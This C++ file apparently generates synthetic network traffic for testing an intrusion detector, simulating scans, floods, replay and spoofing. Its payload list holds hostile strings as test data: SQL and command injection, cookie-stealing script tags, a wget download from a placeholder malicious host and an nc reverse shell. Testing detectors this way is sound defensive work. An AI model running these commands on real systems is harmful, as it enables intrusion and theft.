#include "traffic_simulator.h"
#include <random>
#include <ctime>
#include <map>
#include <set>

// TCP Flags
#define TCP_FIN 0x01
#define TCP_SYN 0x02
#define TCP_RST 0x04
#define TCP_PSH 0x08
#define TCP_ACK 0x10
#define TCP_URG 0x20
#define TCP_ECE 0x40
#define TCP_CWR 0x80

std::vector<Packet> TrafficSimulator::generateTraffic(int count)
{
    std::vector<Packet> packets;
    std::vector<std::string> ip_pool = {
        "192.168.1.10", "192.168.1.15", "10.0.0.2", "10.0.0.5", "172.16.0.3"};

    // Add more diverse and potentially malicious payloads
    std::vector<std::string> payloads = {
        // Normal traffic
        "GET /index.html HTTP/1.1", "POST /login HTTP/1.1", "normal data transfer",

        // SQL Injection attempts
        "SELECT * FROM users WHERE id = 1 OR 1=1",
        "UNION SELECT username, password FROM users",
        "'; DROP TABLE users; --",

        // Command injection
        "eval(base64_decode('ZWNobyAiaGFja2VkIg=='))",
        "system('cat /etc/passwd')",
        "exec('net user admin password123')",

        // Script injection
        "<script>document.cookie</script>",
        "<script>alert(document.cookie)</script>",

        // Shell commands
        "wget http://malicious.com/malware.exe",
        "nc -e /bin/bash 10.0.0.1 4444",
        "chmod +x /tmp/backdoor",

        // Credential exposure
        "password=admin123",
        "admin_pass=root123",

        // Malware signatures
        "MZ\x90\x00\x03\x00\x00\x00", // PE file header
        "\\x90\\x90\\x90\\x90\\x90",  // NOP sled

        // Normal traffic (to mix in)
        "Hello World!", "GET /style.css", "POST /api/data"};

    // Add more ports including suspicious ones
    std::vector<int> ports = {
        80, 443,     // HTTP/HTTPS
        22, 23,      // SSH/Telnet
        445, 139,    // SMB/NetBIOS
        3389,        // RDP
        4444, 31337, // Common backdoor ports
        1433, 3306,  // SQL Server/MySQL
        21, 25       // FTP/SMTP
    };

    std::mt19937 rng(static_cast<unsigned>(time(nullptr)));
    std::uniform_int_distribution<> ip_dist(0, ip_pool.size() - 1);
    std::uniform_int_distribution<> port_dist(0, ports.size() - 1);
    std::uniform_int_distribution<> payload_dist(0, payloads.size() - 1);

    // Keep track of sequence numbers for each connection
    std::map<std::string, uint32_t> seq_tracker;

    // Track used sequence numbers for TCP replay attack simulation
    std::map<std::string, std::set<uint32_t>> used_sequences;

    // Helper for creating connection keys
    auto createConnectionKey = [](const std::string &src, const std::string &dst)
    {
        return src < dst ? src + ":" + dst : dst + ":" + src;
    };

    // SIMULATE PORT SCAN: Generate sequential port scan activity
    if (count > 20)
    {
        std::string scanner_ip = ip_pool[ip_dist(rng)];
        for (int port = 1; port <= 20; port++)
        {
            Packet scan_pkt;
            scan_pkt.src_ip = scanner_ip;
            scan_pkt.dst_ip = "192.168.0.1";
            scan_pkt.port = port;
            scan_pkt.payload = "Port scan probe";
            scan_pkt.flags = TCP_SYN; // SYN packets for scanning
            scan_pkt.seq = 1000 + port;
            packets.push_back(scan_pkt);
        }
    }

    // SIMULATE SYN FLOOD: Generate a SYN flood attack
    if (count > 30)
    {
        std::string syn_flood_ip = ip_pool[0]; // Use first IP for easy identification
        std::string target_ip = "192.168.0.1";

        // Generate many SYN packets with few corresponding ACKs
        for (int i = 0; i < 40; i++)
        {
            Packet syn_pkt;
            syn_pkt.src_ip = syn_flood_ip;
            syn_pkt.dst_ip = target_ip;
            syn_pkt.port = 80;
            syn_pkt.payload = "SYN flood packet";
            syn_pkt.flags = TCP_SYN; // Only SYN flag
            syn_pkt.seq = 2000 + i;
            packets.push_back(syn_pkt);

            // Only add a few ACKs to trigger the detection
            if (i % 10 == 0)
            {
                Packet ack_pkt;
                ack_pkt.src_ip = syn_flood_ip;
                ack_pkt.dst_ip = target_ip;
                ack_pkt.port = 80;
                ack_pkt.payload = "ACK packet";
                ack_pkt.flags = TCP_ACK;
                ack_pkt.seq = 2000 + i + 1;
                packets.push_back(ack_pkt);
            }
        }
    }

    // SIMULATE TCP REPLAY: Generate TCP replay attack (duplicate sequence numbers)
    if (count > 40)
    {
        std::string replay_src = ip_pool[1]; // Use second IP
        std::string replay_dst = "192.168.0.1";
        std::string conn_key = createConnectionKey(replay_src, replay_dst);

        // Generate some normal traffic with sequence numbers
        for (int i = 0; i < 10; i++)
        {
            uint32_t seq = 3000 + i;

            Packet normal_pkt;
            normal_pkt.src_ip = replay_src;
            normal_pkt.dst_ip = replay_dst;
            normal_pkt.port = 443;
            normal_pkt.payload = "Normal HTTPS traffic";
            normal_pkt.flags = TCP_PSH | TCP_ACK;
            normal_pkt.seq = seq;
            packets.push_back(normal_pkt);

            // Store used sequence numbers
            used_sequences[conn_key].insert(seq);
        }

        // Now generate some replay packets with duplicate sequence numbers
        for (int i = 0; i < 5; i++)
        {
            // Reuse a sequence number that was already used
            uint32_t reused_seq = 3000 + (i % 5); // Reuse one of the first 5 sequence numbers

            Packet replay_pkt;
            replay_pkt.src_ip = replay_src;
            replay_pkt.dst_ip = replay_dst;
            replay_pkt.port = 443;
            replay_pkt.payload = "REPLAYED PACKET - Should trigger alert";
            replay_pkt.flags = TCP_PSH | TCP_ACK;
            replay_pkt.seq = reused_seq;
            packets.push_back(replay_pkt);
        }
    }

    // SIMULATE IP SPOOFING: Many sources targeting one destination
    if (count > 50)
    {
        std::string target_ip = "192.168.0.2";

        // Generate traffic from many source IPs to one target
        for (int i = 0; i < 35; i++)
        {
            // Create a spoofed source IP that's not in our normal pool
            std::string spoofed_ip = "10.0." + std::to_string(i) + ".1";

            Packet spoof_pkt;
            spoof_pkt.src_ip = spoofed_ip;
            spoof_pkt.dst_ip = target_ip;
            spoof_pkt.port = 80;
            spoof_pkt.payload = "Spoofed packet";
            spoof_pkt.flags = TCP_SYN | TCP_ACK;
            spoof_pkt.seq = 4000 + i;
            packets.push_back(spoof_pkt);
        }
    }

    // SIMULATE ACK FLOOD: Many ACKs with few established connections
    if (count > 60)
    {
        std::string ack_flood_ip = ip_pool[2]; // Use third IP
        std::string target_ip = "192.168.0.1";

        // Generate a flood of ACK packets
        for (int i = 0; i < 60; i++)
        {
            Packet ack_pkt;
            ack_pkt.src_ip = ack_flood_ip;
            ack_pkt.dst_ip = target_ip;
            ack_pkt.port = 80;
            ack_pkt.payload = "ACK flood packet";
            ack_pkt.flags = TCP_ACK; // Only ACK flag
            ack_pkt.seq = 5000 + i;
            packets.push_back(ack_pkt);
        }

        // Only add a few established connections
        for (int i = 0; i < 5; i++)
        {
            // SYN packet
            Packet syn_pkt;
            syn_pkt.src_ip = ack_flood_ip;
            syn_pkt.dst_ip = target_ip;
            syn_pkt.port = 8000 + i;
            syn_pkt.payload = "SYN packet";
            syn_pkt.flags = TCP_SYN;
            syn_pkt.seq = 6000 + i;
            packets.push_back(syn_pkt);

            // SYN-ACK response
            Packet synack_pkt;
            synack_pkt.src_ip = target_ip;
            synack_pkt.dst_ip = ack_flood_ip;
            synack_pkt.port = 8000 + i;
            synack_pkt.payload = "SYN-ACK packet";
            synack_pkt.flags = TCP_SYN | TCP_ACK;
            synack_pkt.seq = 6500 + i;
            packets.push_back(synack_pkt);

            // ACK to establish connection
            Packet est_ack_pkt;
            est_ack_pkt.src_ip = ack_flood_ip;
            est_ack_pkt.dst_ip = target_ip;
            est_ack_pkt.port = 8000 + i;
            est_ack_pkt.payload = "ACK packet (establishing connection)";
            est_ack_pkt.flags = TCP_ACK;
            est_ack_pkt.seq = 6001 + i;
            packets.push_back(est_ack_pkt);
        }
    }

    // Generate regular traffic mixed with malicious packets
    int regular_count = count - packets.size();
    if (regular_count > 0)
    {
        for (int i = 0; i < regular_count; ++i)
        {
            Packet pkt;
            pkt.src_ip = ip_pool[ip_dist(rng)];
            pkt.dst_ip = "192.168.0.1";
            pkt.port = ports[port_dist(rng)];
            pkt.payload = payloads[payload_dist(rng)];

            // Add TCP flags and sequence numbers
            int flag_type = i % 5;
            switch (flag_type)
            {
            case 0:
                pkt.flags = TCP_SYN;
                break;
            case 1:
                pkt.flags = TCP_ACK;
                break;
            case 2:
                pkt.flags = TCP_SYN | TCP_ACK;
                break;
            case 3:
                pkt.flags = TCP_PSH | TCP_ACK;
                break;
            case 4:
                pkt.flags = TCP_FIN;
                break;
            }

            // Generate unique sequence number for this connection
            std::string conn_key = createConnectionKey(pkt.src_ip, pkt.dst_ip);
            if (seq_tracker.find(conn_key) == seq_tracker.end())
            {
                seq_tracker[conn_key] = 10000 + i;
            }
            pkt.seq = seq_tracker[conn_key]++;

            packets.push_back(pkt);
        }
    }

    return packets;
}